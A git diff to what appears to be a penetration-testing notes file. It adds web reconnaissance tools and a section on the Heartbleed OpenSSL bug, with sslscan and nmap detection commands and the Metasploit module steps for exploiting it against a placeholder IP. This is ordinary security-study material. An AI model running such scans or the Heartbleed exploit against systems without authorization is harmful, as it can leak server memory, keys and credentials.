@@ -7,11 +7,17 @@
 
 ## Scanning and Reconnaissance Tools
 - [Dirbuster](https://www.kali.org/tools/dirbuster/) —
+- dirb
+  - Brute force HTTP(s) directories and files.
+- nikto
+- wfuzz
+- cewl (creating wordlist from webpage)
 - [`smtp-user-enum`](https://pentestmonkey.net/tools/user-enumeration/smtp-user-enum) — Username guessing tool primarily for use against the default SMTP service.
   - [Linux username wordlist](https://github.com/rapid7/metasploit-framework/blob/master/data/wordlists/unix_users.txt)
 - `wget`
 
 - [Zenmap](https://nmap.org/zenmap/) — A graphical user interface for Nmap.
+
 
 
 
@@ -127,6 +133,31 @@ Valid query types include: `A`, `AAAA`, `MX`, `SIG`, `SOA`, `TXT`, etc.
   ```bash
   cat cert.cer | openssl x509 -noout -enddate
   ```
+
+
+## The Heartbleed Bug
+[The Heartbleed Bug](https://heartbleed.com/) is a vulnerability in the OpenSSL cryptographic software library. 
+
+Investigate if an https page is vulnerable to heartbleed:
+```bash
+sudo sslscan <ip address>:443
+```
+Or with an nmap script:
+```bash
+nmap -sV --script=ssl-heartbleed <ip address>
+```
+
+Exploit Heartbleed vulnerability:
+- Module in burp suite. 
+- Metasploit module.
+```bash
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS <ip address>
+set verbose true
+run
+```
+
+
 
 
 ## HTTP response status codes
